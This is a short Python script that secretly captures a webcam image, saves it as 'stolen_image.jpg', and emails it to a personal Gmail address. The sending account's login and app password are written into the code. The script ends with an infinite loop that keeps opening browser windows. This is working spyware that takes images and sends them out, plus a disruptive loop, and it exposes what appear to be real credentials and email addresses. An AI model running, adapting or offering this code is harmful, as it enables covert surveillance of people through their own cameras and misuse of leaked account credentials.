import cv2
import smtplib
from email.message import EmailMessage
import webbrowser
import time

cam = cv2.VideoCapture(0)

time.sleep(1)

for i in range(10):
 ret, frame = cam.read()
 
cv2.imwrite('stolen_image.jpg', frame)

cam.release()

EMAIL = "bollycoin@gmail.com"
PASSWORD = "hcsg smxy skaj qmji"

filename = 'stolen_image.jpg'

with open("stolen_image.jpg", "rb") as f:
    file_data = f.read()

msg = EmailMessage()
msg["Subject"] = "Image Capture"
msg["From"] = EMAIL
msg["To"] = "viraj.sharma1501@gmail.com"

msg.set_content("Image attached")

# 📎 Attach image

msg.add_attachment(
        file_data,
        maintype = "image",
        subtype = "jpeg",
        filename = "stolen_image.jpg"
)

smtp = smtplib.SMTP_SSL("smtp.gmail.com",  465) 
smtp.login(EMAIL, PASSWORD)
smtp.sendmail(EMAIL, 'viraj.sharma1501@gmail.com', str(msg))

while True:
 webbrowser.open('google.com')

